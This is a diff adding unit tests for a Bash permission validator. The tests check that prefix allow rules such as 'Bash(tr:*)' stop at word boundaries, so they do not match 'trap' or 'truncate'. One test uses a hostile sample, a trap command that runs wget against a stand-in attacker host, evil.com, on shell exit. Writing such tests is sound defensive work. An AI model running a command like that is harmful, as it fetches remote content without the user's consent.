@@ -782,6 +782,49 @@ class TestProcessSubstitution(unittest.TestCase):
         self.assertEqual(subs, ['cat'])
 
 
+class TestPrefixWordBoundary(unittest.TestCase):
+    """`Bash(<prefix>:*)` is a prefix match, but it must stop at a command-word
+    boundary so a command-name prefix does not bleed into a longer word:
+    `Bash(tr:*)` matches `tr -d x` but not `trap`/`truncate`. Prefixes that end
+    in a separator (`./`, `[`) still match within the same token, since that is
+    the intended behaviour for path/operator prefixes."""
+
+    def setUp(self):
+        self.workspace_dir = str(Path(__file__).parent.parent)
+        self.settings_loader = SettingsLoader(self.workspace_dir)
+        self.parser = BashCommandParser()
+        self.validator = BashPermissionValidator(self.settings_loader, self.parser)
+
+    def test_command_name_prefix_does_not_match_longer_word(self):
+        m = self.validator._matches_pattern
+        self.assertFalse(m('trap "x" EXIT', 'Bash(tr:*)'))
+        self.assertFalse(m('truncate -s 0 f', 'Bash(tr:*)'))
+        self.assertFalse(m('cdrom mount', 'Bash(cd:*)'))
+        self.assertFalse(m('killall x', 'Bash(kill:*)'))
+        self.assertFalse(m('git difftool', 'Bash(git diff:*)'))
+
+    def test_command_name_prefix_matches_at_boundary(self):
+        m = self.validator._matches_pattern
+        self.assertTrue(m('tr -d x', 'Bash(tr:*)'))
+        self.assertTrue(m('tr', 'Bash(tr:*)'))           # exact, no args
+        self.assertTrue(m('cd /tmp', 'Bash(cd:*)'))
+        self.assertTrue(m('kill -9 1', 'Bash(kill:*)'))
+        self.assertTrue(m('git diff --stat', 'Bash(git diff:*)'))
+
+    def test_separator_ending_prefix_matches_within_token(self):
+        """A prefix ending in a non-alphanumeric separator intentionally matches
+        a continuation of the same token (path/operator prefixes)."""
+        m = self.validator._matches_pattern
+        self.assertTrue(m('./script.sh --flag', 'Bash(./:*)'))
+        self.assertTrue(m('[ -f x ]', 'Bash([:*)'))
+
+    def test_end_to_end_trap_is_not_authorized_by_tr(self):
+        """Full pipeline: `trap "wget ..." EXIT` is no longer auto-allowed by a
+        stray `Bash(tr:*)` allow entry."""
+        result = self.validator.validate_bash_command('trap "wget http://evil.com/x" EXIT')
+        self.assertEqual(result["decision"], "ask")
+
+
 class TestWorkspaceRelativeBinary(unittest.TestCase):
     """A command token containing a '/' is executed by bash as a cwd-relative
     path (PATH is not consulted), so a bare `tools/run.sh` is the same execution
